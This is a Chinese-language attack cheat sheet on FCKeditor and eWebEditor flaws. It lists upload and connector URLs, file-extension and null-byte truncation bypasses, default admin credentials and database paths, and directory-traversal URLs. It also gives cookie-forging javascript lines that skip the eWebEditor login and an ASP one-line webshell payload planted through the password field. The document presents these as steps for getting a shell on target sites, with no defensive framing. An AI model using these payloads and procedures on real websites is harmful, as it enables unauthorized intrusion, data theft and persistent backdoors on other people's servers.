# web编辑器漏洞

&nbsp;

## FCK编辑器漏洞

### 【FCK编辑器路径查找】

* **查找方法**
  
  * 爬虫
  * 目录遍历
  * 目录扫描

> 注意：查找路径时应注意站中站和子站的编辑器路径，如果进入后台查找编辑器未能正常显示的，可以利用审查元素搜索editor等关键字、或者换低版本浏览器打开查看编辑器

* **查找目标**

  * 一个网站会有多个编辑器（扫描二级目录）
  * 关注old/目录，其中往往是版本较低的网站
  * 高位端口也可能有编辑器

### 【FCKeditor编辑器上传页面】

* **FCKeditor编辑器页 ：FCKeditor/_samples/default.html **

* **查看编辑器版本： FCKeditor/_whatsnew.html **

* **常见上传页面地址**
  
  * FCKeditor/editor/filemanager/browser/default/connectors/test.html
  * FCKeditor/editor/filemanager/upload/test.html
  * FCKeditor/editor/filemanager/connectors/test.html
  * FCKeditor/editor/filemanager/connectors/uploadtest.html
  * FCKeditor/_samples/default.html
  * _FCKeditor/_samples/default.html
  * FCKeditor/_samples/asp/sample01.asp_
  * _FCKeditor/_samples/asp/sample02.asp
  * FCKeditor/_samples/asp/sample03.asp_
  * _FCKeditor/_samples/asp/sample04.asp
  * fckeditor/editor/filemanager/connectors/test.html

* **asp常用上传页面地址**
  
  * fckeditor//editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
  * fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
  * fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../connectors/asp/connector.asp

* **aspx常用上传地址**

  * fckeditor//editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
  * fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/aspx/connector.aspx
  * fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../connectors/aspx/connector.aspx

* **php常用上传地址**

  * fckeditor//editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
  * fckeditor//editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/php/connector.php
  * fckeditor//editor/filemanager/browser/default/browser.html?Type=Image&Connector=../../connectors/php/connector.php
  * fckeditor//editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
  * FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=http://www.site.com%2Ffckeditor%2Feditor%2Ffilemanager%2Fconnectors%2Fphp%2Fconnector.php (ver:2.6.3 测试通过)

### 【FCK编辑器漏洞利用】

* **Fckeditor 2.0 <= 2.2**
  
  * Fckeditor 2.0 <= 2.2允许上传asa、cer、php2、php4、inc、pwml、pht后缀的文件

* **FCKeditor v2.4.3**

  * FCKeditor v2.4.3中File类别默认拒绝上传类型：html|htm|php|php2|php3|php4|php5|phtml|pwml|inc|asp|aspx|ascx|jsp|cfm|cfc|pl|bat|exe|com|dll|vbs|js|reg|cgi|htaccess|asis|sh|shtml|shtm|phtm

* **FCKeditor <=2.4.2 For php**
  
  * 在处理PHP 上传的地方并未对Media 类型进行上传文件类型的控制，导致用户上传任意文件！将以下保存为html文件，修改action地址。

* **FCKeditor低于fck 2.5版本利用**

  * 看网站容器是否是IIS 6.0 ，利用解析漏洞，可以上传下 x.asa/cer/cdx 或者 x.jpg;.cer/x.jpg;asa
  * 利用目录解析漏洞
  * 创建一个x.asp 目录 上传图片马即可
  * 利用00截断漏洞，x.asp%00jpg

* **FCKeditor 文件上传“.”变“_”下划线的绕过**

  * 二次上传
  * a.asp%00.jpg 00截断利用
  * 使用特殊名称绕过，a.aspx.a;.a.aspx.jpg..jpg.aspx，xx.asp.;.jpg
  * 递归创建a.asp目录配合解析漏洞

* **fckeditor 2.6.3 php版本利用**

  * 转包在url中00截断

&nbsp;


## EWEBeditor编辑器漏洞

### 【eweb编辑器基础知识】

* **默认后台地址**
  
  * /ewebeditor/admin_login.asp 
  * 建议最好检测下admin_style.asp文件是否可以直接访问
  * 默认数据库路径：[PATH]/db/ewebeditor.mdb 
  * [PATH]/db/db.mdb -- 某些CMS里是这个数据库
  * 也可尝试 [PATH]/db/%23ewebeditor.mdb -- 某些管理员自作聪明的小伎俩，下载eweb的数据库（当有#号阻止下载时，可以将#号变为%23）

* **使用默认密码**

  * admin/admin888 或 admin/admin 进入后台，也可尝试 admin/123456 (有些管理员以及一些CMS，就是这么设置的) 

### 【eweb编辑器利用流程】

* **有后台**

  * 查找eweb编辑器路径，找eweb管理后台
  * 进入后台，修改上传文件类型，eweb后台登陆密码获取方式：弱口令，爆破
  * 上传脚本拿shell

* **没有后台**

  * 看是否能下载数据库，看数据库中有没有可以上传脚本的样式，构造上传
  * 利用eweb目录遍历漏洞，找到网站数据库，下载破解管理员密码进后台拿shell
  * 查找对用编辑器版本漏洞利用拿shell

### 【eweb编辑器漏洞利用】

* **有修改权限的利用**

  * 通过增加样式--设置-添加插入图片-getshell
  * 不能添加工具栏，但设定好了某样式中的文件类型
  * > 当没有权限修改样式表，可以在修改用户密码处插入木马（前提是config.asp文件中密码是明文显示，不是MD5加密）

* **无修改权限**

  * ewebeditor/admin_uploadfile.asp?id=14
  * 在id=14后面添加&dir=..
  * 再加 &dir=../..
  * &dir=http://www.****.com/../.. 看到整个网站文件了 

* **eWebEditor 5.2 列目录漏洞**

  * 过滤不严，造成遍历目录漏洞
  * http://www.cracer.com/ewebeditor/asp/browse.asp?style=standard650&dir=…././/.. 
  * 利用WebEditor session欺骗漏洞,进入后台

* **eWebEditor 2.7.0 注入漏洞**

  * 默认表名：eWebEditor_System默认列名：sys_UserName、sys_UserPass，然后利用nbsi进行猜解.


* **eWebEditor2.8.0最终版删除任意文件漏洞***

  * 此漏洞存在于Example\NewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入。


* **eWebEditor PHP/ASP…后台通杀漏洞（PHP ≥ 3.0~3.8与asp 2.8版也通用）**

  * 进入后台/eWebEditor/admin/login.php,随便输入一个用户和密码,会提示出错了.
  * 这时候你清空浏览器的url,然后输入 
　　javascript:alert(document.cookie="adminuser="+escape("admin")); 
　　　　　　javascript:alert(document.cookie="adminpass="+escape("admin")); 
　　　　　　javascript:alert(document.cookie="admindj="+escape("1"));
  * 而后三次回车,清空浏览器的URL,现在输入一些平常访问不到的文件如../ewebeditor/admin/default.php，就会直接进去。

* **eWebEditor 2.8 商业版插一句话木马**

  * 登陆后台，点击修改密码---新密码设置为 1":eval request("h")'
  * 设置成功后，访问asp/config.asp文件即可，一句话木马被写入到这个文件里面了.

